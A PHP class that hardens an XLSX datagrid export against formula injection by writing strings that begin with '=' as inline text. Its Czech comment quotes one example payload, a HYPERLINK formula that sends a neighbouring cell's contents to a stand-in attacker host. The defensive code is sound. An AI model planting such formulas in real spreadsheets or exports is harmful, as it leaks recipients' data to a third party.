<?php

declare(strict_types=1);

namespace ADT\Datagrid\Model\Export\Excel;

use XLSXWriter;
use XLSXWriter_BuffererWriter;

/**
 * XLSXWriter, ktery nedela vzorce z uzivatelskych dat.
 *
 * mk-j/php_xlsxwriter ma ve writeCell() zamernou vetev, ktera kazdy retezec zacinajici na "="
 * zapise jako <f>, tedy jako zivy vzorec. Pro export gridu je to nepouzitelne - nazvy produktu
 * a kategorii pochazeji od uzivatele, takze se tudy da cizim lidem do exportu propasovat treba
 * =HYPERLINK("http://utocnik/?"&A2,"Klikni").
 *
 * Reseni je strukturalni: v XLSX je bunka vzorcem jen tehdy, kdyz ma element <f>. Kdyz tu samou
 * hodnotu zapiseme jako inline string, Excel ji zobrazi doslova a nic nevyhodnoti. Text zustava
 * beze zmeny, takze na rozdil od CSV (viz FormulaGuard) tu nepotrebujeme zadny uvodni apostrof.
 */
class SafeXlsxWriter extends XLSXWriter
{
	protected function writeCell(XLSXWriter_BuffererWriter &$file, $row_number, $column_number, $value, $num_format_type, $cell_style_idx)
	{
		if (is_string($value) && isset($value[0]) && $value[0] === '=') {
			$file->write(
				'<c r="' . self::xlsCell($row_number, $column_number) . '" s="' . $cell_style_idx . '" t="inlineStr">'
				. '<is><t>' . self::xmlspecialchars($value) . '</t></is>'
				. '</c>'
			);
			return;
		}

		parent::writeCell($file, $row_number, $column_number, $value, $num_format_type, $cell_style_idx);
	}
}
